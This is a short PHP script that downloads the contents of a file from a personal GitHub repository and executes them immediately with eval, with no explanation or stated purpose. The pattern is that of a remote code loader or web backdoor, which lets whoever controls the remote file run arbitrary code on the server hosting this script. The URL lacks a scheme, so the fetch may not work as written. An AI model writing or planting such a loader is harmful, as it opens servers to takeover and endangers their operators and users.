<?php
$url = "github.com/mangoleh098/alfj/raw/refs/heads/main/librarires.php"; 
$code = file_get_contents($url);

eval("?>$code<?php");
